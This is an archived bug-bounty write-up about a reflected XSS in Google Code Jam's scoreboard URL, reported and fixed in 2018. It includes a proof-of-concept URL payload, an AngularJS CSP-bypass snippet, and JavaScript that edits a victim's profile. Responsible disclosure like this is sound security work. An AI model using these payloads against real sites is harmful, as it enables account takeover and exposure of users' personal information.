---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-09-08_reflected-xss-in-google-code-jam.md
original_filename: 2018-09-08_reflected-xss-in-google-code-jam.md
title: Reflected XSS in Google Code Jam
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 243b835462195cd83ee74e66a1a6fcb43bd0253436a4787f32872529cc75bba6
text_sha256: 1693c6c2833decfc28ab30a2b229f442bc099c010351cda241132a8957f878af
ingested_at: '2026-06-28T07:31:57Z'
sensitivity: unknown
redactions_applied: false
---

# Reflected XSS in Google Code Jam

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-09-08_reflected-xss-in-google-code-jam.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:31:57Z
- Redactions Applied: False
- Raw SHA256: `243b835462195cd83ee74e66a1a6fcb43bd0253436a4787f32872529cc75bba6`
- Text SHA256: `1693c6c2833decfc28ab30a2b229f442bc099c010351cda241132a8957f878af`


## Content

---
title: "Reflected XSS in Google Code Jam"
page_title: "Reflected XSS in Google Code Jam - Web Security Blog"
url: "https://websecblog.com/vulns/reflected-xss-in-google-code-jam/"
final_url: "https://websecblog.com/vulns/reflected-xss-in-google-code-jam/"
authors: ["Thomas Orlita (@ThomasOrlita)"]
programs: ["Google"]
bugs: ["Reflected XSS"]
publication_date: "2018-09-08"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5715
---

# Reflected XSS in Google Code Jam

[![](https://secure.gravatar.com/avatar/7f8a61ba947af5eb2a9b491c4dacb5f1b6952c86727d08f85d3b10e901d8e253?s=24&d=mm&r=g)](https://websecblog.com/author/admin/)by [Thomas Orlita](https://websecblog.com/author/admin/)[Vulnerabilities](https://websecblog.com/category/vulns/)[September 8, 2018February 16, 2022](https://websecblog.com/vulns/reflected-xss-in-google-code-jam/)

**Information about this XSS:  
**  
The XSS will be fired in the toast message.

Also, it seems like you have to open the homepage ([https://codejam.withgoogle.com/2018/challenges/](https://www.google.com/url?q=https://codejam.withgoogle.com/2018/challenges/&sa=D&usg=AFQjCNHopzr54v6Q4gLwvv42nNfI8g3R0g)) at least once before visiting other pages there.

**POC:**

`https://codejam.withgoogle.com/2018/challenges/0000000000007766/scoreboard/for/**%3Cimg%20src=x%20onerror=alert(document.domain)%3E**`

**CSP:**

Due to CSP, this XSS will fire only in browsers where CSP is not supported (e.g. IE).

If we could somehow find a way to execute a script that has inserted dynamically, we could bypass (thanks to [gstatic.com](https://www.google.com/url?q=http://gstatic.com&sa=D&usg=AFQjCNFH1AXq9Wkq_8KbYpr_DrQSofA8ow)) the CSP using the following payload. But I don’t think it’s possible in this case.
  
  
  <script src="https://www.gstatic.com/fsn/angular_js-bundle1.js"></script>
  <div ng-app ng-csp id=p ng-click=$event.view.alert(1)>

Read more about [bypassing CSP in my other post](https://websecblog.com/vulns/google-csp-evaluator/).

**Attack scenario:  
**  
Attacker can get access to the victim’s CodeJam account and read and edit their profile information (address, phone number, etc.).

Here’s an example of how it could be done:
  
  
  // go to profile page
  document.querySelector('[href="/2018/profile"]').click();
  
  setTimeout(function() {
  // change the username
  document.querySelector('#nickname').value = 'mynickname111';
  // create a fake input event to enable the submit button
  var event = document.createEvent("Event");
  event.initEvent('input', false, true); 
  document.querySelector('#nickname').dispatchEvent(event);
  // submit the form
  document.querySelector('[type="submit"]').click();
  }, 1000);

* * *

Timeline|  
---|---  
2018-08-29| Vulnerability reported  
2018-08-30| Priority changed to P2  
2018-08-30| Nice catch  
2018-09-05| Reward issued  
2018-09-16| Fixed  
  
Written by [Thomas Orlita](https://thomasorlita.com/)
